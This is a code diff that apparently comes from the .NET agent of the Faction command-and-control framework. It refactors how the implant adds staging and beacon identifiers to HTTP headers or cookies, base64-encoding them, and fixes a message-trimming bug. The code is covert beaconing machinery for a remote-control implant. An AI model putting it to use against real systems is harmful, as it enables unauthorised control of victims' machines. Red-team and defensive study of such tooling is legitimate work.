@@ -94,27 +94,15 @@ namespace Faction.Modules.Dotnet
     private string GetFactionMessage(string Content)
     {
       string factionMessage = Content.Remove(0, Profile.ServerMessageConfig.Prepend.Count());
-      factionMessage = factionMessage.Substring(factionMessage.Length - Profile.ServerMessageConfig.Append.Count());
+      factionMessage = factionMessage.Remove(factionMessage.Length - Profile.ServerMessageConfig.Append.Count());
       return factionMessage;
     }
 
-    private WebClient AddIdentifier(WebClient webClient, string Type, string Identifier)
+    private WebClient AddIdentifier(WebClient webClient, string Identifier, string StageName = null)
     {
-      if (Type == "Staging")
+      if (String.IsNullOrEmpty(StageName))
       {
-        // Add the Stage Message into the request per the configuration
-        if (Profile.StagingIdentifier.Location == "Header")
-        {
-          webClient.Headers.Add(Profile.StagingIdentifier.Name, Identifier);
-        }
-        else if (Profile.StagingIdentifier.Location == "Cookie")
-        {
-          webClient.Headers.Add(HttpRequestHeader.Cookie, $"{Profile.StagingIdentifier.Name}={Identifier}");
-        }
-      }
-      else if (Type == "Beacon")
-      {
-        // Add the Stage Message into the request per the configuration
+        // Add the AgentName into the request per the configuration
         if (Profile.CheckinIdentifier.Location == "Header")
         {
           webClient.Headers.Add(Profile.CheckinIdentifier.Name, Identifier);
@@ -124,10 +112,23 @@ namespace Faction.Modules.Dotnet
           webClient.Headers.Add(HttpRequestHeader.Cookie, $"{Profile.CheckinIdentifier.Name}={Identifier}");
         }
       }
+      else
+      {
+        // Add the StageName into the request per the configuration
+        string mergedId = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{StageName}:{Identifier}"));
+        if (Profile.StagingIdentifier.Location == "Header")
+        {
+          webClient.Headers.Add(Profile.StagingIdentifier.Name, mergedId);
+        }
+        else if (Profile.StagingIdentifier.Location == "Cookie")
+        {
+          webClient.Headers.Add(HttpRequestHeader.Cookie, $"{Profile.StagingIdentifier.Name}={mergedId}");
+        }
+      }
       return webClient;
     }
 
-    private WebClient CreateWebClient(string Type, string Identifier)
+    private WebClient CreateWebClient(string Identifier, string StageName = null)
     {
 #if DEBUG
       Logging.Log($"Creating Web Client..");
@@ -150,7 +151,7 @@ namespace Faction.Modules.Dotnet
       {
         _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{cookie.Key}={cookie.Value}");
       }
-      _webClient = AddIdentifier(_webClient, Type, Identifier);
+      _webClient = AddIdentifier(_webClient, Identifier, StageName);
       return _webClient;
     }
 
@@ -183,7 +184,7 @@ namespace Faction.Modules.Dotnet
       {
         string beaconUrl = GetUrl();
         // Create a new WebClient object and load the Headers/Cookies per the Client Profile
-        WebClient _webClient = CreateWebClient("Staging", StagingId);
+        WebClient _webClient = CreateWebClient(StagingId, StageName);
         string stagingMessage = RenderMessage(Message);
 
 #if DEBUG
@@ -211,7 +212,7 @@ namespace Faction.Modules.Dotnet
 #if DEBUG
       Logging.Log($"Beaconing..");
 #endif
-      WebClient _webClient = CreateWebClient("Beacon", AgentName);
+      WebClient _webClient = CreateWebClient(AgentName);
       string beaconUrl = GetUrl();
       string agentMessage = "";
       string content = "";
